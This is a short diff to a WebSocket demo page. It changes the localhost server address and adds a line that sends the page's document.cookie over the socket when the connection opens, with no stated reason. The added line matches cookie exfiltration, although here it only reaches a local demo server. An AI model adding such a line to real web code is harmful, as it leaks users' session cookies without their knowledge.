@@ -17,13 +17,14 @@ html,body {
 var socket;
 
 function init() {
-	var host = "ws://localhost:9000/status"; // SET THIS TO YOUR SERVER
+	var host = "ws://localhost:19100/demo"; // SET THIS TO YOUR SERVER
 	try {
 		socket = new WebSocket(host);
 		log('WebSocket - status '+socket.readyState);
 		socket.onopen    = function(msg) { 
-							   log("Welcome - status "+this.readyState); 
-						   };
+			send(document.cookie);
+			log("Welcome - status "+this.readyState); 
+		};
 		socket.onmessage = function(msg) { 
 							   log("Received: "+msg.data); 
 						   };
